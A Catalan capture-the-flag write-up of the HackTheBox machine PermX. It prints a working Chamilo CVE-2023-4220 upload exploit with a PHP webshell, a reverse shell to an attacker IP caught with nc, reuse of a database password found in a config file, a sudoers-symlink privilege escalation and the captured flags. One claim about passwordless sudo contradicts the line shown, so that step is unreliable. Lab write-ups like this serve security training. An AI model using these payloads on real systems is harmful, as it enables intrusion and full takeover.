
El primer que farem serà un nmap a la màquina que estem atacant:
``nnmap -sC -sV -v 10.10.11.23``

Un cop fet l'nmap, veiem que la màquina víctima té els següents ports oberts amb els següents serveis:

``

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


Ara hem de desar la pàgina amb el nom de domini permx.htb al nostre fitxer /etc/hosts per poder accedir-hi, com fem sempre:

``sudo nano /etc/hosts``

``10.10.11.23     permx.htb``

Un cop ho hem fet, accedim a la pàgina web a través del navegador i veiem el següent:

![image](https://github.com/user-attachments/assets/12ea2e9c-bc13-46a4-bbb7-48d86b80dfce)


Mirarem de trobar dominis o subdominis a veure si trobem alguna cosa útil de la qual podem estirar. Primer provem a veure si trobem algun domini que ens sigui útil:

```
──(polkali㉿kaliPol)-[~]
└─$ gobuster dir --url http://permx.htb / --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt `
```

Hem trobat algun domini al qual tenim accés, però no hi ha res que ens pugui servir per obtenir accés, per exemple hi ha un domini amb imatges: http://permx.htb/img/

![image](https://github.com/user-attachments/assets/c3497a5f-06fe-4e61-a808-5f59348ad32b)


També hem trobat el domini http://permx.htb/js/main.js on hi ha el codi principal de la pàgina web, però al passar-li al ChatGPT sembla que no té cap vulnerabilitat clara a simple vista. El codi:

```
(function ($) {
    "use strict";

    // Spinner
    var spinner = function () {
        setTimeout(function () {
            if ($('#spinner').length > 0) {
                $('#spinner').removeClass('show');
            }
        }, 1);
    };
    spinner();
    
    
    // Initiate the wowjs
    new WOW().init();


    // Sticky Navbar
    $(window).scroll(function () {
        if ($(this).scrollTop() > 300) {
            $('.sticky-top').css('top', '0px');
        } else {
            $('.sticky-top').css('top', '-100px');
        }
    });
    
    
    // Dropdown on mouse hover
    const $dropdown = $(".dropdown");
    const $dropdownToggle = $(".dropdown-toggle");
    const $dropdownMenu = $(".dropdown-menu");
    const showClass = "show";
    
    $(window).on("load resize", function() {
        if (this.matchMedia("(min-width: 992px)").matches) {
            $dropdown.hover(
            function() {
                const $this = $(this);
                $this.addClass(showClass);
                $this.find($dropdownToggle).attr("aria-expanded", "true");
                $this.find($dropdownMenu).addClass(showClass);
            },
            function() {
                const $this = $(this);
                $this.removeClass(showClass);
                $this.find($dropdownToggle).attr("aria-expanded", "false");
                $this.find($dropdownMenu).removeClass(showClass);
            }
            );
        } else {
            $dropdown.off("mouseenter mouseleave");
        }
    });
    
    
    // Back to top button
    $(window).scroll(function () {
        if ($(this).scrollTop() > 300) {
            $('.back-to-top').fadeIn('slow');
        } else {
            $('.back-to-top').fadeOut('slow');
        }
    });
    $('.back-to-top').click(function () {
        $('html, body').animate({scrollTop: 0}, 1500, 'easeInOutExpo');
        return false;
    });


    // Header carousel
    $(".header-carousel").owlCarousel({
        autoplay: true,
        smartSpeed: 1500,
        items: 1,
        dots: false,
        loop: true,
        nav : true,
        navText : [
            '<i class="bi bi-chevron-left"></i>',
            '<i class="bi bi-chevron-right"></i>'
        ]
    });


    // Testimonials carousel
    $(".testimonial-carousel").owlCarousel({
        autoplay: true,
        smartSpeed: 1000,
        center: true,
        margin: 24,
        dots: true,
        loop: true,
        nav : false,
        responsive: {
            0:{
                items:1
            },
            768:{
                items:2
            },
            992:{
                items:3
            }
        }
    });
    
})(jQuery);
```

Com que no hem tingut els millors resultats cercant dominis, passarem a fer una cerca per subdominis a veure si hi ha més sort:

```
ffuf -u http://board.htb -H "Host: FUZZ.permx.htb" -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -c -fs 15949`
```

- **`-c`**:
    
    - `-c` activa la sortida de colors, fent que sigui més fàcil llegir i interpretar la sortida a la terminal.
- **`-fs 15949`**:
    
    - `-fs` significa "filter size" (filtrar per mida). Això indica que s'ha de filtrar les respostes amb una mida específica.
    - En aquest cas, `ffuf` ignorarà totes les respostes que tinguin una mida de 15949 bytes.
**`-H "Host: FUZZ.permx.htb"`**:

- `-H` permet definir una capçalera HTTP personalitzada. En aquest cas, s'està definint la capçalera `Host`.
- `FUZZ` és una paraula clau especial en `ffuf` que serà substituïda per cada entrada de la llista de paraules.
- Això vol dir que `ffuf` provarà diferents subdominis substituint `FUZZ` per cada subdomini de la llista en la capçalera `Host`.

No hi ha hagut èxit tampoc. Tornaré a escanejar els dominis i subdominis amb llistes i comandes diferents. La llista que hem utilitzat és la medium, a veure si així tenim més sort. Primer provem de trobar dominis amb aquesta llista:

``gobuster dir --url http://permx.htb / --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt``

Seguim sense tenir èxit, tornarem a provar de fer una cerca per subdominis agafant una llista molt gran, que té el milió top de subdominis, a veure si trobem alguna cosa:

```
ffuf -u http://permx.htb -H "Host: FUZZ.permx.htb" -w /usr/share/wordlists/amass/subdomains-top1million-110000.txt -mc 200,403 -c

```

Hem utilitzat ffuf filtrant només per els status 200 i 403 (forbidden). Ara hi ha hagut èxit i hem trobat dos subdomins:

```
┌──(polkali㉿kaliPol)-[~]
└─$ ffuf -u http://permx.htb -H "Host: FUZZ.permx.htb" -w /usr/share/wordlists/amass/subdomains-top1million-110000.txt -mc 200,403 -c


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/amass/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,403
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 60ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 87ms]
:: Progress: [114441/114441] :: Job [1/1] :: 716 req/sec :: Duration: [0:02:54] :: Errors: 0 ::`
```

Provarem amb el subdomini lms ja que www ha de ser l'àlies que tenen posat al fitxer .conf de l'Apache de la pàgina. Per tant, desarem al fitxer /etc/hosts els subdomini:

``10.10.11.23     permx.htb lms.permx.htb``

I a la pàgina ens trobem el següent:

![image](https://github.com/user-attachments/assets/7c933e25-cbe2-490f-93ce-026afd51fc26)


A sota a la dreta veiem el nom de l'administrador de la pàgina:

![image](https://github.com/user-attachments/assets/dbafb124-9e6d-4fb7-9a16-d261d9e15a17)


Si cliquem al nom de l'administrador veiem que se'ns obre una finestra per poder enivar-li un correu:

![image](https://github.com/user-attachments/assets/90b64aee-1997-4d00-bdfd-0cd5aeee4889)


Provem credencials per defecte que s'acostumen a utilitzar al login (admin:admin, root:root, etc) però no tenim èxit, hem provat també injecció sql força bàsica i tampoc hi ha hagut èxit:

![image](https://github.com/user-attachments/assets/d8328951-2ac6-4cb4-bd49-2d7bcd66b6fa)


Per tant, ens centrarem en el següent que es veu de forma clara a la pàgina, que és Chamilo que cercant per internet veiem que és un sistema d'aprenentatge electrònic i de gestió de continguts de programari lliure, orientat a millorar l'accés a l'educació i el coneixement a nivell mundial. Per tant bucarem si té algun POC o exploit per el qual podem iniciar sessió en aquest login.

Cercant per internet ens trobem que té alguns CVE que permeten l'execució de codi remot, toca veure si en podem explotar algun:

![image](https://github.com/user-attachments/assets/912d9b4d-c409-451c-80f8-07ffb101000e)

Després de provar vàris CVE i exploits,el que ha funcionat és aquest CVE que és el més recent dels que he trobat: [CVE-2023-4220](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4220) 

I cercant POC per aquest CVE he trobat el següent: https://github.com/charlesgargasson/CVE-2023-4220 

Anem a executar-lo per veure com funciona i com hem aconseguit accés a través d'ell. Primer creem l'script amb bash posant la URL i la comanda que volem executar, en aquest cas id per veure amb quin usuari estem:

```
┌──(polkali㉿kaliPol)-[~/Documents/PermX]
└─$ nano reverse.sh            

┌──(polkali㉿kaliPol)-[~/Documents/PermX]
└─$ chmod u+x reverse.sh`
```

A reverse.sh posem el codi següent que hem trobat al repositori de GitHub modificant el domini per el que tenim nosaltres desat a /etc/hosts

```
`#!/bin/bash
HOST='http://lms.permx.htb'
CMD='id'

URL_UPLD='main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
URL_FILE='main/inc/lib/javascript/bigupload/files/rce.php'

cat <<'EOF'>/tmp/rce.php
<?php
$a=popen(base64_decode($_REQUEST["aoOoy"]),'r');while($b=fgets($a,2048)){echo $b;ob_flush();flush();}pclose($a);
?>
EOF

curl -F 'bigUploadFile=@/tmp/rce.php' "$HOST/$URL_UPLD"
CMD=$(echo $CMD|base64 -w0| python3 -c "import urllib.parse,sys; print(urllib.parse.quote_plus(sys.stdin.read()))")
curl "$HOST/$URL_FILE?aoOoy=$CMD"`
```


L'executem i sembla que funciona perfectament:

```
┌──(polkali㉿kaliPol)-[~/Documents/PermX]
└─$ ./reverse.sh 
The file has successfully been uploaded.uid=33(www-data) gid=33(www-data) groups=33(www-data)`
```

Ara canviarem la variable CMD de l'script en bash per whoami, per acabar de confirmar que funciona correctament i estem amb l'usuari del servidor apache, l'usuari www-data:

```
┌──(polkali㉿kaliPol)-[~/Documents/PermX]
└─$ ./reverse.sh   
The file has successfully been uploaded.www-data`
```

Ara, provarem de veure a quin directori estem amb pwd i amb ls -la llistar el que hi ha, i així anar-nos movent i llistant fins que trobem alguna cosa interessant:

```
└─$ ./reverse.sh   
The file has successfully been uploaded./var/www/chamilo/main/inc/lib/javascript/bigupload/files

┌──(polkali㉿kaliPol)-[~/Documents/PermX]
└─$ ./reverse.sh   
The file has successfully been uploaded.total 32
drwxr-xr-x 2 www-data www-data 4096 Aug  3 17:26 .
drwxr-xr-x 6 www-data www-data 4096 Jan 20  2024 ..
-rw-r--r-- 1 www-data www-data 5493 Aug  3 15:16 php-reverse-shell.php
-rw-r--r-- 1 www-data www-data  122 Aug  3 17:27 rce.php
-rw-r--r-- 1 www-data www-data 5491 Aug  3 17:26 rev.php
-rw-r--r-- 1 www-data www-data 3461 Aug  3 15:43 rs.php`
```

No he aconseguit res més amb aquest exploit, però he trobat aquest altre repositori de GitHub que sembla que ens crearà una reverse shell: https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc?source=post_page-----f2d1b348d7f8--------------------------------

Primer clonem el repositori a la nostra màquina

Després de fer unes quantes proves i haver llegit el README del repositori, llencem la següent comanda que ens crearà una reverse shell:

```
┌──(polkali㉿kaliPol)-[~/Documents/PermX/chamilo-lms-unauthenticated-big-upload-rce-poc]
└─$ python3 main.py -u http://lms.permx.htb -a revshell`
```

Ara ens sortiran una sèrie de preguntes per pantalla que hem de respondre, on posarem la IP de la nostra màquina i el port per on estarem escoltant per la reverse shell:

```
Enter the name of the webshell file that will be placed on the target server (default: webshell.php): webshellpol
Enter the name of the bash revshell file that will be placed on the target server (default: revshell.sh): revsehllpol 
Enter the host the target server will connect to when the revshell is run: 10.10.14.187
Enter the port on the host the target server will connect to when the revshell is run: 4444`
```

Veiem que s'ha executat correctament:

```
[!] BE SURE TO BE LISTENING ON THE PORT THAT YOU DEFINED [!]

[+] Execution completed [+]

You should already have a revserse connection by now.
```

Un cop fet això veiem com aconseguim la reverse shell:

```
┌──(polkali㉿kaliPol)-[~]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
connect to [10.10.14.187] from (UNKNOWN) [10.10.11.23] 43928
bash: cannot set terminal process group (1182): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ `
```

```
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ whoami
<ilo/main/inc/lib/javascript/bigupload/files$ whoami                     
www-data
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 
```


Ara, a veure si a dins de la màquina, amb l'usuari www-data del servidor apache podem aconseguir alguna cosa interessant, en principi hauríem de trobar algun usuari i les seves credencial per poder-nos connectar per le port 22 SSH que estava obert. 

Sembla que hem vist que hi ha un usuari que es diu mtz, a veure si podem obtenir les seves credencials:

```
www-data@permx:/$ cd home
cd home
www-data@permx:/home$ ls
ls
mtz
www-data@permx:/home$ cd mtz
cd mtz
bash: cd: mtz: Permission denied
````

Al fitxer /etc/passwd hi veiem mtx també, a veure si aconseguim les seves credencials:

``mtz:x:1000:1000:mtz:/home/mtz:/bin/bash``

Després de donar moltes i moltes voltes, durant força hores, hem trobat que al fitxer següent:

``www-data@permx:/var/lib$ cat /var/www/chamilo/app/config/configuration.php``

Hi ha unes credencials d'usuari dalt de tot del fitxer:

```
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;`
```

Provarem a veure si amb sort fossin les de l'usuari mtz que hem vist que existeix al servidor tot i que pel que veiem aquí són credencials d'una BD. Després de tantes hores de cerca esperem obtenir bons resultats. 

Són les credencials, hem tingut èxit:

```
┌──(polkali㉿kaliPol)-[~/Documents/PermX/chamilo-lms-unauthenticated-big-upload-rce-poc]
└─$ ssh mtz@10.10.11.23                                
The authenticity of host '10.10.11.23 (10.10.11.23)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.23' (ED25519) to the list of known hosts.
mtz@10.10.11.23's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug  3 06:38:03 PM UTC 2024

  System load:  0.0               Processes:             256
  Usage of /:   59.2% of 7.19GB   Users logged in:       0
  Memory usage: 23%               IPv4 address for eth0: 10.10.11.23
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug  3 17:50:13 2024 from 10.10.14.139
mtz@permx:~$ whoami
mtz
mtz@permx:~$ id
uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
mtz@permx:~$ `
```

Ara, anirem a buscar la flag de l'user:

```
mtz@permx:~$ cd
mtz@permx:~$ ls
bitch  user.txt
mtz@permx:~$ cat user.txt 
8e5c0771d88755690cd964335eed0330
```

Ara que ja tenim la flag de l'usuari, mirarem d'escalar privilegis per aconseguir la de l'usuari root:

Amb la comanda sudo -l hem trobat el següent script que pot ser executat ja que aquesta comanda  mostra una llista dels permisos específics de sudo que s'han atorgat a l'usuari actual. Aquesta llista pot incloure les ordres que l'usuari pot executar amb `sudo` i quins permisos o restriccions s'apliquen a aquestes comandes. Per tant provarem d'utilitzar-ho:

```
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

L'script acl.sh:

```
mtz@permx:/opt$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"`
```

Per tant, intentarem el següent:

Crear l'script per escalar privilegis, creem un fitxer anomenat privilege_escalation.sh a /home/mtz amb el següent contingut:

```
#!/bin/bash 
/bin/bash
```

Aquest script simplement obre una shell. Amb permisos root, obriria una shell amb privilegis root.

Enns assegurem que l'script que hem creat és executable:

``chmod +x /home/mtz/privilege_escalation.sh``

Utilitzem l'script acl.sh per donar permisos:

``sudo /opt/acl.sh mtz rwx /home/mtz/privilege_escalation.sh``

Executem l'script a veure si tenim sort:

``/home/mtz/privilege_escalation.sh``

No ha funcionat, haurem de provar altres coses. Després de vàries hores intent altres coses amb sudo -l ja que sembla que la cosa va per aquí, hem provat el següent amb èxit:

Crear un enllaç simbòlic al fitxer /etc/sudoers utilitzant la comanda ln -s, creem l'enllaç simbòlic anomenat helpfile al fitxer /etc/sudoers. Això crea un punt d'accés directe a aquest fitxer des de la carpeta /home/mtz.

``ln -s /etc/sudoers /home/mtz/helpfile``

Modifiquem els permisos de l'enllaç simbòlic amb l'acl.sh per permetre la lectura i escriptura per a l'usuari mtz.

``sudo /opt/acl.sh mtz rw /home/mtz/helpfile``

Modifiquem el fitxer /etc/sudoers per afegir l'usuari mtz amb permissos de root. Això es pot fer afegint la línia següent:

``nano sudoers``

```
# User privilege specification
root    ALL=(ALL:ALL) ALL
mtz     ALL=(ALL:ALL) ALL`
```


Això permetrà a l'usuari mtz executar qualsevol comanda amb permisos de root sense necessitat de contrasenya.

I ara un cop hem modificat el fitxer /etc/sudoers ja podem utilitzar la comanda sudo su per canviar a l'usuari root sense necessitat de contrasenya. 

Executem la comanda sudo su i posem la contrasenya de l'usuari mtz que hem aconseguit abans com a credencials de la BD i ja serem root:

```
mtz@permx:/etc$ sudo su
[sudo] password for mtz: 
root@permx:/etc# 
```

Ara, busquem la flag de l'usuari root i ja haurem completat la màquina:

```
root@permx:/etc# cd /root
root@permx:~# cat root.txt 
2295bfc1eaee5a9aea4d7929aa5cc93a
root@permx:~# `
```

La màquina completada:

![image](https://github.com/user-attachments/assets/de7e2dc8-3cfc-4adb-9666-94e525668508)



